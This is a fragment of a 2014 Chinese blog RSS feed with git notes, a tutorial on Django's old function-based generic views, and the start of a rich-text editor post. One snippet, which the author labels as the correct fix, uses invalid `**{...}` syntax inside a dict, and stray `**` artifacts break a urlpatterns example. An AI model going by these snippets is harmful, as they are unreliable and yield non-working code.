&lt;li&gt;由于是测试环境，有些时候遇到冲突，使用了强制执行。加个参数 &lt;code&gt;-f&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;修改Git remote add时使用的远程仓库&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;git remote rm origin &lt;/li&gt;
&lt;li&gt;git remote add origin git@xxx&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 20 Mar 2014 00:00:00 +0000</pubDate><guid>tag:,2014-03-20:git-learn.html</guid><category>git</category></item><item><title>django笔记之Generic views</title><link>/django-Generic-views.html</link><description>&lt;p&gt;为何要使用通用视图呢，一步步地定义url，写函数取数据，渲染模板不也能完成任务么？仅仅因为这些函数比较高级，我们就得学，为了证明自己django用的熟练？当然不是啦，djangobook中有一段话很好地回答了&lt;code&gt;why&lt;/code&gt;的问题：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;在最坏的情况下， Web开发是一项无聊而且单调的工作（大多情况还是很有趣的啦～）。在视图的层面上，也经历着这种令人厌倦的事情。Django的通用视图可以减少这些痛苦。 它抽象出一些在视图开发中常用的代码和&lt;code&gt;模式&lt;/code&gt;，这样就可以在无需编写大量代码的情况下，快速编写出常用的数据视图。 事实上，前面章节中的几乎所有视图的示例都可以在通用视图的帮助下重写。&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;'技术让生活更美好'，我们只是想拥有更多的时间陪喜欢的人，做喜欢的事，更多的时间出游，看书，睡懒觉。所以我们需要更高级的工具来节省时间，提高效率。那么我们还有什么理由不好好学习高级工具呢。&lt;br /&gt;
好的既然值得学习，我们趁热打铁进入内容部分吧。  &lt;/p&gt;
&lt;p&gt;&lt;a href="http://djangobook.py3k.cn/2.0/chapter11/"&gt;Djangobook第11章&lt;/a&gt;中说内建通用视图可以实现如下功能：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;完成常用的简单任务： 重定向到另一个页面以及渲染一个指定的模板。  &lt;/li&gt;
&lt;li&gt;显示列表和某个特定对象的详细内容页面。     &lt;/li&gt;
&lt;li&gt;呈现基于日期的数据的年/月/日归档页面，关联的详情页面，最新页面。像是典型的新闻报纸归档。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这些都是极其常见的需求，尤其是在一个新闻发布系统中，而大多企业建站需要的仅仅是个新闻发布系统而已。  &lt;/p&gt;
&lt;h3&gt;使用举例：&lt;/h3&gt;
&lt;h4&gt;direct_to_template&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#url.py&lt;/span&gt;
&lt;span class="c1"&gt;#coding=utf-8&lt;/span&gt;
&lt;span class="c1"&gt;#呈现静态“关于”页面&lt;/span&gt;

&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.conf.urls.defaults&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.generic.simple&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;direct_to_template&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^about/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;direct_to_template&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="s1"&gt;&amp;#39;template&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;about.html&amp;#39;&lt;/span&gt;
    &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;direct_to_template视图仅仅是直接从传递过来的额外参数获取信息并用于渲染视图。&lt;br /&gt;
这样就不用为了呈现一个静态页，mvc都得走一遍。&lt;br /&gt;
direct_to_template 。 因为它返回一个&lt;code&gt;HttpResponse&lt;/code&gt;对象，我们只需要简单的返回它就好了。例如可以这样：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;about_pages&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;direct_to_template&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;template&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;about/&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;.html&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;except&lt;/span&gt; &lt;span class="n"&gt;TemplateDoesNotExist&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;raise&lt;/span&gt; &lt;span class="n"&gt;Http404&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;code&gt;其他通用视图也是同理。&lt;/code&gt;&lt;/p&gt;
&lt;h4&gt;对象的通用视图&lt;code&gt;list_detail&lt;/code&gt;(使用&lt;code&gt;djangobook&lt;/code&gt;中的例子)&lt;/h4&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#models.py&lt;/span&gt;
&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Publisher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;Model&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;address&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;city&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;60&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;state_province&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;30&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;country&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;CharField&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max_length&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;50&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;website&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;models&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;URLField&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__unicode__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;

    &lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Meta&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="n"&gt;ordering&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;

&lt;span class="c1"&gt;#urls.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.conf.urls.defaults&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.generic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;list_detail&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mysite.books.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Publisher&lt;/span&gt;

&lt;span class="n"&gt;publisher_info&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;queryset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Publisher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;template_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;publisher_list_page.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="c1"&gt;#&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^publishers/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;list_detail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;object_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;publisher_info&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;那么通用视图究竟有哪些可选的参数呢，可以参考这里&lt;a href="http://www.djangobook.com/en/2.0/appendixC.html"&gt;Appendix C: Generic View Reference&lt;/a&gt;&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;object_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;queryset&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;paginate_by&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;page&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;allow_empty&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;True&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="n"&gt;template_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;template_loader&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;loader&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;extra_context&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; 
        &lt;span class="n"&gt;context_processors&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;template_object_name&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;object&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;mimetype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="bp"&gt;None&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;特别说明下context字典项会被模板使用。如果不指定模板，该函数将使用[app_name]/[model_name]_list.html作为模板，这很有些&lt;code&gt;约定优于配置&lt;/code&gt;味道。&lt;/p&gt;
&lt;p&gt;object_list函数创建的&lt;code&gt;context&lt;/code&gt;中会包含许多字典项：
&lt;a href="http://blog.csdn.net/thinkinside/article/details/7251130"&gt;深入Django(1): 通用视图 (generic views)&lt;/a&gt;这篇博客给出了详细的中文注释：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;object_list          要显示的对象的list&lt;/li&gt;
&lt;li&gt;is_paginated         是否分页 &lt;/li&gt;
&lt;li&gt;results_per_page    如果分页，存储每页记录数&lt;/li&gt;
&lt;li&gt;has_next             是否有下一页&lt;/li&gt;
&lt;li&gt;has_previous       是否有上一页&lt;/li&gt;
&lt;li&gt;page                 当前页码&lt;/li&gt;
&lt;li&gt;next                 下一页&lt;/li&gt;
&lt;li&gt;previous             上一页&lt;/li&gt;
&lt;li&gt;pages                 总页数&lt;/li&gt;
&lt;li&gt;hits                 总条目数&lt;/li&gt;
&lt;li&gt;last_on_page       本页最后录一条记录的序数（从1开始）&lt;/li&gt;
&lt;li&gt;first_on_page       本页第一条记录的序数（从1开始）&lt;/li&gt;
&lt;li&gt;page_range          页码范围的列表  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果这些context字典项不能满足你的需要，还可以通过指定extra_context参数，传入一个字典，该字典中的内容会被合并到context字典中。我们接下去说如何扩展通用视图，go on ～&lt;/p&gt;
&lt;h4&gt;扩展通用视图&lt;/h4&gt;
&lt;p&gt;在我们最开始举的publisher例子中（来自djanobook），可以这样扩展context字典&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;publisher_info&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;queryset&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Publisher&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;(),&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;template_object_name&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;publisher&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;extra_context&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;book_list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;()}&lt;/span&gt;&lt;span class="err"&gt;，&lt;/span&gt;&lt;span class="c1"&gt;#这是错的！！使用下面一个&lt;/span&gt;
    &lt;span class="s1"&gt;&amp;#39;extra_context&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;book_list&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;all&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这样就把一个 {{ book_list }} 变量放到模板的context中。 这个方法可以用来传递任意数据 到通用视图模板中去，这是非常方便的.  &lt;br /&gt;
需要注意的是all()不可立刻触发，应当由请求事件来触发，因此作为函数传递，不写().这是一个函数的引用，并没有真正调用它（通用视图将会在渲染时调用它）。&lt;br /&gt;
还有就是选项'queryset'仅仅是普通的queryset，你可以用对象的子集，比如&lt;code&gt;'queryset':Publisher.objects.filter(name='Harry')&lt;/code&gt;&lt;/p&gt;
&lt;h3&gt;当数据过滤比较复杂时&lt;/h3&gt;
&lt;p&gt;这是我们可以把通用视图写到函数里，前头说过&lt;code&gt;通用视图返回一个&lt;/code&gt;HttpResponse&lt;code&gt;对象&lt;/code&gt;，我们提供参数返回它就好，故而用在views中是没问题的，像酱紫：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#urls.py&lt;/span&gt;
&lt;span class="n"&gt;urlpatterns&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;patterns&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^publishers/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;list_detail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;object_list&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;publisher_info&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
    &lt;span class="o"&gt;**&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;r&amp;#39;^books/(\w+)/$&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;books_by_publisher&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;&lt;span class="o"&gt;**&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="c1"&gt;#views.py&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.shortcuts&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;get_object_or_404&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;django.views.generic&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;list_detail&lt;/span&gt;
&lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;mysite.books.models&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;Publisher&lt;/span&gt;

&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;books_by_publisher&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;

    &lt;span class="c1"&gt;# Look up the publisher (and raise a 404 if it can&amp;#39;t be found).&lt;/span&gt;
    &lt;span class="n"&gt;publisher&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;get_object_or_404&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Publisher&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;name__iexact&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;name&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="c1"&gt;# Use the object_list view for the heavy lifting.&lt;/span&gt;
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;list_detail&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;object_list&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
        &lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;queryset&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Book&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;objects&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;publisher&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;publisher&lt;/span&gt;&lt;span class="p"&gt;),&lt;/span&gt;
        &lt;span class="n"&gt;template_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;books/books_by_publisher.html&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;template_object_name&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;book&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
        &lt;span class="n"&gt;extra_context&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;publisher&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;publisher&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;我的个人习惯是直接查阅源码来得快些。推荐使用github的库内搜索功能，比如我们搜索django，之后在django项目中搜索object_list，这样每回遇到新的库，不一定非要下载到本地看代码样随时随地想起来都可以查阅，甚至火车晚点时，可以用手机看看源码。读源码也挺有意思的。许多大项目，源码都写得十分漂亮。&lt;/p&gt;
&lt;p&gt;好了，你现在有了更高效的工具了，因此节约出来的时间可以陪小伙伴去玩耍啦&lt;/p&gt;
&lt;h3&gt;Django提供的其他通用视图&lt;/h3&gt;
&lt;p&gt;我们用&lt;a href="http://blog.csdn.net/thinkinside/article/details/7251130"&gt;深入Django(1): 通用视图 (generic views)&lt;/a&gt;中归纳的：&lt;/p&gt;
&lt;p&gt;分布在几个模块中：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;django.views.generic.list_detail模块&lt;/li&gt;
&lt;li&gt;object_list      显示模型对象列表    &lt;/li&gt;
&lt;li&gt;object_detail  显示单个模型对象&lt;/li&gt;
&lt;li&gt;django.views.generic.create_update模块&lt;/li&gt;
&lt;li&gt;create_object    创建模型对象&lt;/li&gt;
&lt;li&gt;update_object   修改模型对象&lt;/li&gt;
&lt;li&gt;delete_object    删除模型对象 &lt;/li&gt;
&lt;li&gt;django.views.generic.simple模块&lt;/li&gt;
&lt;li&gt;direct_to_template   直接使用指定的模板渲染给定的context对象&lt;/li&gt;
&lt;li&gt;redirect_to   重定向到指定的url&lt;/li&gt;
&lt;li&gt;django.views.generic.date_based模块&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;这个模块主要处理“按时间查看存档”的功能，来源于新闻出版行业。具体包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;archive_index   最顶级的归档，列出所有年份及指定数量的最新对象&lt;/li&gt;
&lt;li&gt;archive_year     按年归档，列出所有拥有对象的月份&lt;/li&gt;
&lt;li&gt;archive_month   按月归档，列出本月的所有对象，找到拥有对象的上一个、下一个月份&lt;/li&gt;
&lt;li&gt;archive_week     按周归档，列出本周的所有对象&lt;/li&gt;
&lt;li&gt;archive_day     按日归档，列出当天的所有对象，找到拥有对象的上一个、下一个日期&lt;/li&gt;
&lt;li&gt;archive_today     当前日期（今天）的按日归档&lt;/li&gt;
&lt;li&gt;object_detail     显示按照年/月/日/序号找到的对象&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;剩下的就是查阅文档，了解参数了。  &lt;/p&gt;
&lt;p&gt;我的个人习惯是直接查阅源码来得快些。推荐使用github的库内搜索功能，比如我们搜索django，之后在django项目中搜索object_list，这样每回遇到新的库，不一定非要下载到本地看代码样随时随地想起来都可以查阅，甚至火车晚点时，可以用手机看看源码。读源码也挺有意思的。许多大项目，源码都写得十分漂亮。&lt;/p&gt;
&lt;h3&gt;参考资料：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://djangobook.py3k.cn/2.0/chapter11/"&gt;djangobook第11章&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="http://blog.csdn.net/thinkinside/article/details/7251130"&gt;深入Django(1): 通用视图 (generic views)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="http://www.djangobook.com/en/2.0/appendixC.html"&gt;Appendix C: Generic View Reference&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 11 Mar 2014 00:00:00 +0000</pubDate><guid>tag:,2014-03-11:django-Generic-views.html</guid><category>django</category></item><item><title>django笔记之富文本编辑器</title><link>/django-WYSIWYG.html</link><description>&lt;p&gt;个人而言我更喜欢markdown，django中配置使用markdown很简单。一两分钟的功夫而已。就不在这里说了。  &lt;br /&gt;
对于普通用户，还是更喜欢富文本编辑器的。  &lt;/p&gt;
&lt;h3&gt;Ueditor&lt;/h3&gt;
